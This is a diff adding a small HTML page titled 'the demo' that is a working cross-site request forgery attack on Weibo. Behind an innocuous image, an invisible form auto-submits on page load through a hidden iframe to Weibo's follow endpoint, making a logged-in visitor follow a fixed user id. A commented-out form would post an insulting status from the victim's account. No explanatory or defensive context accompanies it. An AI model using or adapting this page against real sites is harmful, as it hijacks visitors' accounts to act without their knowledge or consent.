@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8" />
+<title>the demo</title>
+</head>
+<body>
+    <img src="http://pic3.zhongsou.com/image/3805efbf2f95c0b681f.jpg">
+    <form target="hidIfr1" id="test1" style="visiable:hidden;width:0;height:0;opacity:0;" action=http://s.weibo.com/ajax/usercard/relation?fajtype=follow&__rnd=1426508058469 method=POST>
+        <input type="text" name="xx" value="11" />
+        <input type="text" name="uid" value="2526304235">
+    </form>
+    <!--<form id="" target="hidIfr1" style="visiable:hidden" action="http://weibo.com/aj/mblog/add" method="post">
+    	<input type="text" name="text" value="%40enml%20%E6%88%91%E6%98%AF%E5%82%BB%E9%80%BC">
+    </form>-->
+	<iframe name="hidIfr1" src="" style="opacity:0;height:0;visiable:hidden;"></iframe>
+<script>
+	document.querySelector('#test1').submit();
+</script>
+</body>
+</html>
